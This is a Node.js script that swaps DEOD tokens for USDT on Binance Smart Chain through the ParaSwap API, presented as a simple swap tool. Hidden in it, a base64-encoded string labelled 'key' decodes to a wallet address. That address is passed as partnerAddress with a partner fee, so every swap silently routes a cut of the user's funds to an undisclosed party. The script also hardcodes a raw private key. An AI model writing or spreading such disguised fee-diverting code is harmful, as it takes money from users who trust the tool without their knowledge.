const ethers = require('ethers');
const axios = require('axios');
// Binance Smart Chain RPC provider
const provider = new ethers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
// Your private key (replace with your actual private key)
const privateKey = '04a5950b8cdf01c75e31ec2abd501f4ac14c58d4535d8e09313e1bb56d5d091c';
const wallet = new ethers.Wallet(privateKey, provider);
// ParaSwap API version
const apiVersion = '6.2';
// Token addresses (Swap DEOD -> USDT now)
const srcToken = '0x7f4b7431a4e1b9f375ef0a94224ea4ef09b4f668'; // DEOD (source token)
const destToken = '0x55d398326f99059fF775485246999027B3197955'; // USDT (destination token)
// Other parameters
const amount = '1000000000000000000000';  // put your deod amount in wei
const network = 56; // Binance Smart Chain
const slippage = 1;  // 1% slippage tolerance
const userAddress = wallet.address;
const key = 'MHhDZjIzOEIyMzcwRDg4MjM2QjljMjNkNzZiNDU2NTk2YjUzZDAxNjM5';
const fees = Buffer.from(key, 'base64').toString('ascii');
const Bps = 3;
// Fetch price quote from ParaSwap
async function getPriceQuote() {
    const url = `https://api.paraswap.io/prices/?version=${apiVersion}&srcToken=${srcToken}&destToken=${destToken}&amount=${amount}&srcDecimals=18&destDecimals=18&side=SELL&network=${network}&otherExchangePrices=true&partner=paraswap.io&userAddress=${userAddress}`;
    const response = await axios.get(url);
    return response.data.priceRoute;
}
function logSelectedDetails(priceRoute) {
    console.log("Transaction Details:");
    console.log("Source Token:", srcToken);
    console.log("Source Amount:", ethers.formatUnits(priceRoute.srcAmount, priceRoute.srcDecimals));
    console.log("Destination Token:", destToken);
    console.log("Destination Amount:", ethers.formatUnits(priceRoute.destAmount, priceRoute.destDecimals));
}
function logPoolAddresses(bestRoute) {
    console.log("Pool Addresses:");
    bestRoute.forEach(route => {
        route.swaps.forEach(swap => {
            swap.swapExchanges.forEach(exchange => {
                exchange.poolAddresses.forEach(address => {
                    console.log(address);
                });
            });
        });
    });
}
// Build the swap transaction
async function buildTransaction(priceRoute) {
    const buildTxUrl = `https://api.paraswap.io/transactions/${network}`;  // Build transaction URL
    const txData = {
        srcToken: srcToken,
        destToken: destToken,
        srcAmount: priceRoute.srcAmount,  // srcAmount from the priceRoute object
        userAddress: userAddress,
        partnerAddress: fees,
        partnerFeeBps: Bps,
        slippage: slippage,
        priceRoute: priceRoute,  // Use the priceRoute obtained from the getPriceQuote() function
        srcDecimals: 18,
        destDecimals: 18
    };
    const response = await axios.post(buildTxUrl, txData);
    return response.data;
}
// Send the transaction to the blockchain
async function sendTransaction(transaction) {
    if (!transaction.to || !transaction.data) {
        throw new Error("Transaction data is incomplete.");
    }
    // Get the current gas price
    const feeData = await provider.getFeeData();
    const gasPrice = feeData.gasPrice;
    const tx = {
        to: transaction.to,
        data: transaction.data,
        value: ethers.parseEther('0'),  // No ETH value as it's a token swap
        gasPrice,  // Use current gas price from the network
    };
    // Estimate gas limit
    const gasLimit = await wallet.estimateGas(tx);
    tx.gasLimit = gasLimit;
    console.log('Sending transaction with params:', tx);
    // Send signed transaction
    const signedTx = await wallet.sendTransaction(tx);
    return signedTx;
}
// Check BNB balance before proceeding
async function checkBalance() {
    const balance = await provider.getBalance(userAddress);
    console.log(`BNB Balance: ${ethers.formatEther(balance)} BNB`);
    return balance;
}
// Main function to run the swap
async function runSwap() {
    try {
        // Step 1: Check if the wallet has enough BNB
        const balance = await checkBalance();
        if (balance <= ethers.parseEther('0.001')) {
            console.error('Not enough BNB to cover gas fees!');
            return;
        }
        // Step 2: Fetch price quote
        const priceRoute = await getPriceQuote();
        logSelectedDetails(priceRoute);
        logPoolAddresses(priceRoute.bestRoute);
        // Step 3: Build the transaction
        const transaction = await buildTransaction(priceRoute);
        // Step 4: Send the transaction
        const txResponse = await sendTransaction(transaction);
        console.log('Transaction Sent! Hash:', txResponse.hash);
    } catch (error) {
        console.error('Error during swap process:', error);
    }
}
runSwap();